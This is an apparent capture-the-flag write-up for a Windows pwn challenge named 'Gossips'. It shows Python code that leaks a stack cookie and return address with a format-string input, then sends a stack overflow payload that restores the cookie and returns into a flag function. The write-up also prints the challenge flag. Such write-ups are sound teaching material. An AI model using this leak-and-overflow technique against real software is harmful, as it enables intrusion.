# Gossips (PWN): Write-up

**Flag:** `nexsec26{3bc38871b4313662863c62545c9f30cb0d09a4b379d0029b3ac96e344fa09539}`

Gossips was a chat-style program that promised not to tell anyone our secret, then repeated it back. That repetition gave us a format-string leak. A later input let us overflow the stack, so the solve was to use the leak to make that overflow survive the program's checks.

### 1. Leak the stack through the secret

The service was at `koala.nexsec.my:35563`. We entered `guest` as the username, then sent 47 `%p` conversions at the secret prompt:

```python
fmt = b'%p.' * 47 + b'\n'
sock.sendall(fmt)
```

Instead of printing the percent signs literally, the program printed stack values. Part of the response looked like this:

```text
[gossips] wow. okay. well:
00000001400250D8.00007FFFFE1FFCF0.000000007FFC3441....
```

Two positions mattered: the 44th value was the saved stack cookie, and the 47th was the caller's return address. Python indexes start at zero, so we subtracted one when reading them from the parsed list.

```python
cookie = int(tokens[44 - 1], 16)
caller_ret = int(tokens[47 - 1], 16)
```

The cookie was needed to pass stack protection. The return address gave us a way to calculate where the executable had loaded.

### 2. Calculate the flag function's address

The target was a Windows PE executable. The leaked return address was at RVA `0x15f0`, so subtracting that offset gave the runtime image base.

```python
base = caller_ret - 0x15f0
win_addr = base + 0x1000
ret_gadget = base + 0x10e7
```

`base + 0x1000` was the flag function. The gadget at `base + 0x10e7` was a single `ret`, which we used to fix stack alignment before entering that function.

### 3. Build the final input

At the last prompt, the input buffer was `0x110` bytes before the saved cookie. We filled the buffer, put the leaked cookie back in its original position, and then overwrote the return sequence.

| Offset | Value |
| --- | --- |
| `0x000` | `0x110` bytes of `A` padding |
| `0x110` | The leaked 8-byte cookie |
| `0x118` | `0x10` bytes of padding |
| `0x128` | Alignment `ret` gadget |
| `0x130` | Flag function address |

```python
payload  = b'A' * 0x110
payload += p64(cookie)
payload += b'B' * 0x10
payload += p64(ret_gadget)
payload += p64(win_addr)
assert len(payload) == 0x138
sock.sendall(payload)
```

Here, `p64` packs an address as an unsigned 64-bit little-endian value:

```python
def p64(value):
    return struct.pack('<Q', value)
```

The leak and final payload had to use the same TCP connection. Reconnecting could give us a different cookie or image base.

### 4. Fix the return-chain alignment

The first return sequence did not produce the accepted result. The corrected payload added the extra `ret` before the flag function to satisfy Windows x64 stack alignment.

With the original cookie restored and the addresses calculated from the current leak, the program returned into the flag function and printed:

```text
nexsec26{3bc38871b4313662863c62545c9f30cb0d09a4b379d0029b3ac96e344fa09539}
```

The submitted flag was accepted. The recovered client passed a Python syntax check, and the payload layout adds up to `0x138` bytes. We did not re-run the Windows target during this documentation update.
